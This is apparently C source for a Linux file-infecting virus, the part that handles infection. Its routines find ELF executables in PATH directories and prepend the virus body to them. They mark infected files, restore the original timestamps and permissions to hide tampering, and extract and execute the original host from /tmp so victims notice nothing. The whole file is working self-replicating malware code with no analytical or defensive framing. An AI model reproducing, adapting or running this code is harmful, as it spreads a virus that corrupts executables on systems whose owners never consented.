/* Thiz file contains the routines for writing the code etc. */

#include <stdio.h> /* .h files maybe different in different OS */
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <linux/dirent.h>

#include "vx.h"

#define TEMP "/tmp/temp"      /* with this generate the name of the EXE */
#define TMP  "/tmp/tmp"       /*  */

/*------------------------------*/

#ifdef DEBUG
extern FILE *fd; /* debugging */
#endif

struct utimbuf {
      time_t actime;
      time_t modtime;
}; 

/* ATA, ATH, ATD ... not found in my .h's */

extern int utime(char *, struct utimbuf*); 

/* infect <anz> files , Auftraggeber is <caller> */

int infect(int anz, char *caller)
{
	int i = 0, j = 0;
	char *dir, *f, *path;
        
        char file[200];
	struct stat status;               /* save time ... */       	
                
        path = getenv("PATH");
        if ((dir = getdir(path)) == NULL) /* find directory */
           	return -1;

   	while (i < anz && j < 10) { /* <anz> times  */
           	DFPRINTF("------------- new infection stack ----------\n");
                DFPRINTF("@f infect: directory of infection is <%s>\n", dir);
           	j++;
           	if ((f = gethost(dir, FILEPATH)) == NULL) 
                   	continue;                		
                strcpy(file, f);        	
                if (saveattribs(file, &status) < 0)
                   	continue;
                if (infect_host(file, caller) < 0)
                   	continue;
                if (restoreattribs(file, status) < 0)
                   	continue;
                i++;
                j = 0;
                DFPRINTF("@f infect: infected file is <%s>\n", file);
        }
        return i;   	
}


/* infect <host> directly  */

int infect_host(char *host, char *caller)
{
     	int in,out,
            r,w; 
     	const int vlength = VLENGTH;
     	char *buff;	  
         
     	if ((buff = (char*)malloc(vlength)) == NULL)
           	return -1;

/* copy	<host> to tempfile, open and truncate [the host] 
 * and copy the beginning (virus, vlength byte) of the running 
 * program [file 'caller'] to it.
 */   
     	if (cp(host, TMP) == -1)
        	return -1;
                
        DFPRINTF("@f infect_host: copied <%s> to <%s> \n", host, TMP);
     	if ((in = open(caller, O_RDONLY)) == -1)
        	return -1; 
     	if ((out = open(host, O_RDWR|O_TRUNC)) == -1)
     	   	return -1;
        DFPRINTF("@f infect_host: opened host <%s> and caller <%s>\n", host, caller); 
     	if ((r = read(in, buff, vlength)) == -1)
        	return -1; 
     	if ((w = write(out, buff, vlength)) == -1)
        	return -1;
     	close(in);
     	if ((in = open(TMP, O_RDWR)) == -1)
           	return -1;

/* append the rest of the original file to the host -> end of infection */
  
     	while ((r = read(in, buff, vlength)) > 0) {
        	if ((w = write(out, buff, r)) == -1)
           		return -1; 
     	}	
     	close(in);
     	close(out);
     	free(buff);
        DFPRINTF("@f infect_host: try to remove <%s>\n", TMP);
     	remove(TMP);
     	return 0;
} 



/*       --------------------  isinfected  --------------------- 
 *	 look if a 'detectstring' appears at the end of 'ffile' 
 *	 return 1 if so, 0 if not
 */
 
int isinfected (char *ffile)
{
        int out,r = 0;
   	char cmp[4] = {0};

   	DFPRINTF("@f isinfected: look at <%s>\n", ffile);
   	if ((out = open(ffile, O_RDONLY)) == -1)
           	return -1;
   	if ((r = lseek(out, VLENGTH + 1, SEEK_SET)) == -1)
           	return -1;  
   	if ((r = read (out, cmp, 3)) == -1) 
           	return -1;
   	if (strcmp("ELF", cmp) == 0) {
      		close(out);
      		return 1;
   	} else 
        { 
             	close(out); 
                return 0; 
        }
}  

/*       ------------  iself  ------------ 
 *	 look if 'host' is ELF
 *	 return 1 if so, 0 if not
 *       [buggy: an objectfile is also elf as a full executable {:-(8 ]
 */

int iself(char *host)
{
	int in,
            r = 0;
     	char mn[5] = {0x7f,0x45,0x4c,0x46,'\0'}, /* .ELF */
           buff[5] = {'\0'};
        DFPRINTF("@f iself: look at file <%s>\n", host);
     	if ((in = open(host, O_RDONLY)) == -1)
           	return -1;
     	if ((r = read(in, buff,4)) == -1)
        	return -1;
     	if (strcmp(buff, mn) == 0) {
        	close (in);
            	return 1;
        }
        else {
   		close (in);  
        	return 0; 
     	} 
}      

/* isclean() returns 1 if 'file' is clean
 * and 0 if not -  "clean" means healty,
 * ELF-executable and normal file (not dir ...)
 */

int isclean(char *file)
{
   	if (isregular(file) == 0)  /* prove this first !!! */
           	return 0;        
        if (isinfected(file) == 1)
           	return 0;
        if (iself(file) == 0)
           	return 0;
        return 1;
}

/* is <file> a normal one ? (links are, directorys not)
 * returns 1 if so
 */


int isregular(char *file)
{
   	struct stat status;
       
        DFPRINTF("@f isregular: <%s>\n", file); 
        if (stat(file, &status) == -1)
           	return 0;
        if (!S_ISREG(status.st_mode))
           	return 0;
        else
           	return 1;
}        
        

/*       ---------------    exechost     ------------------
 *	 execs the file wich follows the virii and wich must
 *	 be seppareted 
 */

int exechost(char *caller, char **arglist, char **envlist)
{
  
     	int i, j, in, out,
            r, w;
     	char *buff;    
	const int vlength = VLENGTH;
        char tempfile[20];
        struct stat status;
        

        DFPRINTF("@f exechost: caller = <%s> argv[0] = <%s>\n", caller, arglist[0]);
        DFPRINTF("=========== end of report =============\n");        
#ifdef DEBUG
        if (fd != stdout)
           	fclose(fd);
#endif     
 
     	if ((buff = (char*)(malloc(vlength))) == NULL)
        	return -1;
/* copy rest out of the program */

     	if ((in = open(caller, O_RDONLY)) == -1) 
        	return -1;             

/* Since the files wich are just executed are locked (can't be opened for
 * writing) and more than one of them can run at the same time [that means 
 * also more that one of a infected file ...] under UNIX we have to search 
 * for the next tempfile (/tmp/tempXYZ) we can use. 
 */
     	out = -1;
        j = 0;
        while (out < 0) {
           	sprintf(tempfile, "%s%d", TEMP, j++);
           	out = open(tempfile, O_RDWR|O_CREAT|O_TRUNC);
        }


/* from position 'vlength' ,the virus ends there  */

     	if (lseek(in, vlength, SEEK_SET) == -1)
        	return -1;
     	while ((r = read(in, buff, vlength)) > 0) {
        	if ((w = write(out, buff, r)) == -1)
           		return -1; 
     	}
     	close(in);
     	close(out);
     	free(buff);

        /* put the ORIGINAL attribs of the file to the tempfile */
     	saveattribs(caller, &status);
        restoreattribs(tempfile, status);
        
        execve(tempfile, arglist, envlist);
        while (1);
}
 

/* ------------------------------- cp ----------------------------
 * copy 'oldfile' to 'newfile' ,don't look for permissons
 */

int cp(char *oldfile,char *newfile)
 {
    char *buff;
    int nf,of,r,w;
 
    if ((buff = (char*)malloc(5000)) == NULL)
       	    return -1;
    if ((of = open(oldfile, O_RDONLY)) == -1)
            return -1;
    if ((nf = open(newfile, O_RDWR|O_CREAT|O_TRUNC)) == -1)
      	    return -1;   
    while ((r = read(of, buff, 5000)) > 0) {
       if ((w = write(nf, buff, r)) == -1)
            return -1; 
    }     
    DFPRINTF("@f cp: successfull copy of %s to %s\n", oldfile, newfile);
    free(buff);
    close(nf);
    close(of);
    return 0;
 }    

/*---------------------------------------------*/

int saveattribs(char *host, struct stat *status)
{       
        return stat(host, status);
}

/*---------------------------------------------*/

int restoreattribs(char *host, struct stat status)
{
	struct utimbuf time;
        int retval;
        
	if ((retval = chmod(host, status.st_mode)) < 0)
           	return retval;         
        time.actime = status.st_atime;
        time.modtime = status.st_mtime;
        return utime(host, &time);   
}

